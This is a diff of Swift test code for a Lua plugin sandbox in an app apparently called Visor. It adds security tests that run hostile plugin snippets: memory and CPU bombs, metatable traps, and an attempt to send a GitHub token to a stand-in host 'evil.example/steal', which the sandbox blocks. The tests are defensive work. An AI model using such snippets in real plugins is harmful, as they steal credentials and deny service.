@@ -38,7 +38,7 @@ struct PluginManifestTests {
         """#
         let m = try PluginManifest.parse(Data(json.utf8))
         #expect(m.id == "github" && m.name == "GitHub" && m.main == "main.lua")
-        #expect(m.secrets["token"] == "gh auth token --hostname {host}")
+        #expect(m.secrets["token"] == PluginSecret(command: "gh auth token --hostname {host}"))
         #expect(m.allows(URL(string: "https://api.github.com/repos/a/b")!))
         #expect(m.allows(URL(string: "https://acme.ghe.com/api/v3/user")!))
         #expect(!m.allows(URL(string: "https://ghe.com/x")!), "the wildcard needs a subdomain")
@@ -55,7 +55,7 @@ struct PluginManifestTests {
 @Suite("Lua plugins")
 struct LuaPluginTests {
     func plugin(_ source: String, hosts: [String] = ["api.github.com"], store: Data? = nil, settings: [String: Any] = [:]) throws -> (LuaPlugin, FakeHost) {
-        let manifest = PluginManifest(id: "test", name: "Test", hosts: hosts, secrets: ["token": "gh auth token"])
+        let manifest = PluginManifest(id: "test", name: "Test", hosts: hosts, secrets: ["token": PluginSecret(command: "gh auth token --hostname {host}")])
         let host = FakeHost()
         let p = try LuaPlugin(manifest: manifest, source: source, host: host, store: store, settings: settings)
         return (p, host)
@@ -128,13 +128,12 @@ struct LuaPluginTests {
 
     @Test func secretsAndRepos() throws {
         let (p, host) = try plugin("""
-        visor.log(visor.secret("token", "acme.ghe.com"), tostring(visor.secret("nope")))
         local r = visor.repos()[1]
         visor.log(r.host, r.owner, r.name, r.branch)
         """)
         host.repoList = [PluginRepo(host: "github.com", owner: "octocat", name: "visor", branch: "main", path: "/Users/me/visor")]
         try p.start()
-        #expect(host.logs == ["s3cret-acme.ghe.com nil", "github.com octocat visor main"])
+        #expect(host.logs == ["github.com octocat visor main"])
     }
 
     /// A loop that never ends is stopped, and the plugin keeps working.
@@ -393,5 +392,143 @@ struct FocusPluginTests {
               case .stat(_, "paused", _, _, _) = pausedLeft[0] else { Issue.record("not paused"); return }
         #expect(host.outputs.last?.badge == nil)
         #expect(host.errors.isEmpty, "\(host.errors)")
+    }
+}
+
+/// What a hostile or buggy plugin tries, and what stops it.
+@Suite("Plugin security")
+struct PluginSecurityTests {
+    func plugin(_ source: String, manifest: PluginManifest? = nil) throws -> (LuaPlugin, FakeHost) {
+        let host = FakeHost()
+        let m = manifest ?? PluginManifest(id: "evil", name: "Evil", hosts: ["api.github.com", "evil.example"],
+                                           secrets: ["token": PluginSecret(command: "gh auth token --hostname {host}")])
+        return (try LuaPlugin(manifest: m, source: source, host: host), host)
+    }
+
+    /// Memory is capped: a huge string fails inside the plugin instead of taking Visor down.
+    @Test func memoryCap() throws {
+        let (p, host) = try plugin("local ok, err = pcall(string.rep, 'x', 100 * 1024 * 1024); visor.log(tostring(ok), tostring(err):find('memory') ~= nil)")
+        try p.start()
+        #expect(host.logs == ["false true"], "\(host.logs)")
+    }
+
+    /// Pattern matching runs in C, out of the instruction budget's sight: it has its own step limit.
+    @Test func slowPatternsStop() throws {
+        let (p, host) = try plugin("""
+        local s = string.rep("a", 20000)
+        local ok, err = pcall(string.find, s, ".-.-.-.-b")
+        visor.log(tostring(ok), tostring(err):find("too slow") ~= nil)
+        visor.log(string.find("hello world", "o w"))
+        """)
+        let started = Date()
+        try p.start()
+        #expect(Date().timeIntervalSince(started) < 5)
+        #expect(host.logs == ["false true", "5 7"])
+    }
+
+    /// Deep JSON from a server goes into Lua without overrunning its stack.
+    @Test func deepJSON() throws {
+        let (p, host) = try plugin("""
+        local r = visor.http.get("https://api.github.com/deep")
+        local depth, t = 0, r.json
+        while type(t) == "table" do depth = depth + 1; t = t[1] end
+        visor.log(depth > 0)
+        """)
+        host.response = PluginResponse(status: 200, body: Data((String(repeating: "[", count: 300) + String(repeating: "]", count: 300)).utf8),
+                                       headers: [:], cached: false)
+        try p.start()
+        #expect(host.logs == ["true"])
+    }
+
+    /// Tables with metatables never run plugin code from Visor's side.
+    @Test func metatablesOnVisor() throws {
+        let (p, host) = try plugin("""
+        setmetatable(visor, { __index = function() error("gotcha") end })
+        visor.store = nil
+        local bomb = setmetatable({}, { __index = function() while true do end end })
+        visor.view(bomb)
+        visor.log("survived")
+        """)
+        try p.start()
+        #expect(host.logs == ["survived"])
+    }
+
+    /// Finalizers are refused, so closing a plugin can't hang.
+    @Test func noFinalizers() throws {
+        let (p, host) = try plugin("local ok = pcall(setmetatable, {}, { __gc = function() while true do end end }); visor.log(tostring(ok))")
+        try p.start()
+        #expect(host.logs == ["false"])
+    }
+
+    /// Plugins never see a secret, and a sign-in only goes to its own host.
+    @Test func secretsStayWithTheirHost() throws {
+        let (p, host) = try plugin("""
+        visor.log(tostring(visor.secret))
+        visor.http.get("https://api.github.com/user", { auth = "token", auth_host = "github.com" })
+        local ok = pcall(visor.http.get, "https://evil.example/steal", { auth = "token", auth_host = "github.com" })
+        visor.log(tostring(ok))
+        """)
+        try p.start()
+        #expect(host.logs == ["nil", "false"])
+        #expect(host.requests.count == 1 && host.requests[0].headers["Authorization"] == "Bearer s3cret-github.com")
+    }
+
+    /// A secret without {host} goes only to the hosts it names.
+    @Test func secretWithHosts() throws {
+        let m = PluginManifest(id: "x", name: "X", hosts: ["api.example.com", "evil.example"],
+                               secrets: ["token": PluginSecret(command: "op read op://Dev/api/token", hosts: ["api.example.com"])])
+        let (p, host) = try plugin("""
+        visor.http.get("https://api.example.com/a", { auth = "token", auth_header = "PRIVATE-TOKEN", auth_scheme = "" })
+        visor.log(tostring((pcall(visor.http.get, "https://evil.example/", { auth = "token" }))))
+        """, manifest: m)
+        try p.start()
+        #expect(host.logs == ["false"])
+        #expect(host.requests.count == 1 && host.requests[0].headers["PRIVATE-TOKEN"] != nil)
+    }
+
+    @Test func manifestSecretForms() throws {
+        let m = try PluginManifest.parse(Data(#"""
+        {"id":"a","name":"A","secrets":{"gh":"gh auth token --hostname {host}","op":{"command":"op read op://x","hosts":["api.example.com"]},"bad":"op read op://y"}}
+        """#.utf8))
+        #expect(m.secrets["gh"] == PluginSecret(command: "gh auth token --hostname {host}"))
+        #expect(m.secrets["op"] == PluginSecret(command: "op read op://x", hosts: ["api.example.com"]))
+        #expect(m.secrets["bad"] == nil, "a secret that names no host would be usable anywhere")
+    }
+
+    /// Silly intervals don't crash; timers and handlers are limited.
+    @Test func timersAndHandlersAreBounded() throws {
+        let (p, _) = try plugin("""
+        visor.every(1e300, function() end)
+        visor.every(0/0, function() end)
+        for i = 1, 100 do pcall(visor.every, 60, function() end) end
+        for i = 1, 100 do pcall(visor.on, "a" .. i, function() end) end
+        """)
+        try p.start()
+        #expect(p.timers.count == LuaPlugin.maxTimers)
+        #expect(p.timers.allSatisfy { $0.interval >= 30 && $0.interval <= 7 * 86400 })
+    }
+
+    /// Showing in a loop sends one update per call; peeks and requests are rationed.
+    @Test func floodsAreCoalesced() throws {
+        let (p, host) = try plugin("""
+        for i = 1, 1000 do visor.view(visor.ui.text { "n" .. i }) end
+        for i = 1, 10 do visor.peek({ title = "spam " .. i }) end
+        local ok = true
+        for i = 1, 100 do ok = pcall(visor.http.get, "https://api.github.com/" .. i) if not ok then break end end
+        visor.log(tostring(ok))
+        """)
+        try p.start()
+        #expect(host.outputs.count == 1)
+        #expect(host.outputs.last?.view == .text("n1000", style: .body, state: nil))
+        #expect(host.peeks.count == 1)
+        #expect(host.requests.count == LuaPlugin.maxRequestsPerCall)
+        #expect(host.logs == ["false"])
+    }
+
+    /// Stored data has a size limit.
+    @Test func storeLimit() throws {
+        let (p, host) = try plugin("visor.store.big = string.rep('x', 2 * 1024 * 1024)")
+        #expect(throws: PluginError.self) { try p.start() }
+        #expect((host.saved?.count ?? 0) < 1024, "the 2 MB store wasn't written")
     }
 }
